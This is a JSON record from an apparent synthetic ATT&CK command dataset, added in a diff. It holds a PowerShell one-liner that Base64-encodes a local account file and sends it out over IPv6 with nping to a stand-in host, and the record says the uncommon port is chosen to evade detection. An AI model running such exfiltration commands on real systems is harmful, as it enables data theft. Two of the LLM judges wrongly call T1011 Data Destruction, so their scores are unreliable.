@@ -1,0 +1,56 @@
+{
+  "technique_id": "T1011",
+  "platform": "Windows",
+  "shell": "Powershell",
+  "command": "$b=[Convert]::ToBase64String([IO.File]::ReadAllBytes('C:\\ProgramData\\acct.bin')); nping.exe -6 --tcp --flags psh,ack --dest-port 59055 --data-string $b -c 1 2001:db8:dead:beef::25",
+  "explanation": "Uses nping to inject a TCP payload over IPv6 with PSH/ACK to a non-standard port, providing a separate path from typical web exfiltration and matching T1011's use of alternative network mediums.",
+  "rationale_steps": [
+    "Prepare Base64 data for transfer as TCP payload.",
+    "Send a single IPv6 TCP packet with payload to an uncommon high port to minimize detection."
+  ],
+  "obfuscation_level": "none",
+  "id": "SYN-POWERSHELL-T1011-6919b9bb-5747d5e0",
+  "source_prompt_hash": "6919b9bb",
+  "timestamp_utc": "2025-09-30T08:36:22.996855Z",
+  "validation": {
+    "syntax_ok": null,
+    "llm_judgments": [
+      {
+        "model": "claude-3-7-sonnet",
+        "syntactic_score": 5,
+        "syntactic_justification": "The command is perfectly well-formed with proper PowerShell syntax, balanced quotes, valid variable assignment, proper method calls, and correct nping parameter formatting.",
+        "semantic_score": 2,
+        "semantic_justification": "The command is misaligned with T1011 (Exfiltration Over Other Network Medium) but does not match T1485 (Data Destruction) as it's exfiltrating data over IPv6 rather than destroying it.",
+        "combined_score": 3.5,
+        "confidence": 0.9,
+        "timestamp": "2025-10-02T01:30:40.916021Z"
+      },
+      {
+        "model": "gemini-2.0-flash-thinking-exp",
+        "syntactic_score": 5,
+        "syntactic_justification": "The PowerShell command and `nping.exe` arguments are all perfectly well-formed with correct syntax, balanced elements, and valid flag usage.",
+        "semantic_score": 1,
+        "semantic_justification": "The command performs data exfiltration by reading a file and sending its Base64-encoded content over the network, which is entirely misaligned with the stated MITRE ATT&CK technique T1011 (Data Destruction).",
+        "combined_score": 3.0,
+        "confidence": 1,
+        "timestamp": "2025-10-02T01:30:46.042659Z"
+      },
+      {
+        "model": "gpt-5",
+        "syntactic_score": 5,
+        "syntactic_justification": "PowerShell variable assignment and the nping invocation use valid syntax, balanced quoting, proper separators, and valid nping flags/arguments with a parseable IPv6 target.",
+        "semantic_score": 1,
+        "semantic_justification": "This command performs IPv6 TCP exfiltration rather than data destruction (as described for T1011 here), and also depends on conditions likely unmet (admin/raw socket privileges, routable address, single-packet payload limits).",
+        "combined_score": 3.0,
+        "confidence": 0.7,
+        "timestamp": "2025-10-02T01:31:30.358070Z"
+      }
+    ],
+    "llm_average_syntactic": 5.0,
+    "llm_average_semantic": 1.333,
+    "llm_average_score": 3.167,
+    "llm_verdict": "likely_mismatch",
+    "sandbox_trace_id": null,
+    "mitre_match_score": null
+  }
+}
